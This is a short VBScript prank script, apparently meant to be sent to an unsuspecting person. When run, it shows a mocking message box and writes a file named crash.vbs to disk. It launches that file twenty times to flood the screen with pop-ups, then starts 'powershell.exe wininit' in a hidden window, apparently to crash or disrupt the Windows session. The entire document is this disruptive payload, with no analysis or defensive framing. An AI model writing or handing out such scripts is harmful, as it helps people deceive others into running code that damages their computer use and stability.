msgbox "you got fooled lmfao"
createobject("scripting.filesystemobject").createtextfile("crash.vbs").write("msgbox ""FJSIODJGIOJSDIOGJDFIOGJDFIGODJ""")

for i = 1 to 20
  createobject("wscript.shell").run "crash.vbs"
next
createobject("wscript.shell").run "powershell.exe wininit", 0, true
